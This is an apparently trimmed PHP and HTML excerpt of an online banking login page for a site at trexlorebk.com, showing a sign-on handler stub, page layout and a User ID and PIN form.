...
if(isset($_REQUEST['Signon']))
{
	...
	while($dt = mysql_fetch_array($sql)) {
         	...
         	if($message=="")
         	{
         		$message="Account in review please contact customer service ";
         	}
           }
...
<div class="row" style="font-size:11px;   font-family: Trebuchet, sans-serif;">
		<div class="col-md-5" style="background-color: white;">
		    
		    <div style="text-align: center;margin-top:20%"><img src="banneriamge.png" width="80%"></div>
			
		</div>
		<div class="col-md-7" style="background-color: #00529a;height: 100vh;margin:0px;color:white">
			<div style="text-align: center;margin-top: 15%">
				<img src="https://trexlorebk.com/logo.png">
			</div>
		<div>
...
';
    	...
    	?>
            ...
            <label for="exampleInputEmail1">Please login by entering your User ID and Personal Identification Number (PIN).</label>
<form autocomplete="off" name="mdlogon" class="mdlogon mdIALogonEnrollPac" method="post" action="" onSubmit="return checkAll(this);">
  ...
  <div class="form-group">
    ...
    <input type="password" class="form-control" id="exampleInputPassword1" name="password"
        ...
        size="9"
        maxlength="8"
        id="password" placeholder="Personal Identification Number (PIN)" required>
  </div>
  <input type="submit" title="Login to Online Banking" name="Signon"  value="Log in to my Account" class="submit btn btn-primary"/>
  
</form>
<br>
<a style="color:white;text-align:center" href="https://trexlorebk.com/online/main/termspage.php">Register Account Online</a>
</div>
		</div>
		</div>
